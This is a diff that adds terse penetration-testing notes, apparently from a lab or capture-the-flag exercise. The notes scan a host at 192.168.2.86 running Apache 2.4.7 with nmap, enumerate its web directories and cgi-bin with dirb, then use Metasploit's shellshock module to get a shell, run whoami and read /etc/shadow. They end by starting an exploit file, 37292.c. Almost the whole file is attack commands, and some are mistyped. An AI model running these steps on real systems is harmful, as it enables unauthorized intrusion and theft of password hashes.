@@ -1,0 +1,24 @@
+Nmap ip address -sV -0 -P1-65535
+APACHE HTTPD 2.4.7
+
+
+
+dirb:
+dirb http://192.168.2.86
+dirb http://192.168.2.86/cgi-bin/-
+
+
+suo msfconsole:
+search shellshock
+use 1
+show options
+exploit
+sysinfo
+shell
+whoami
+cat /etc/shadow
+
+
+
+touch 37292.c
+mousepad 37292.c
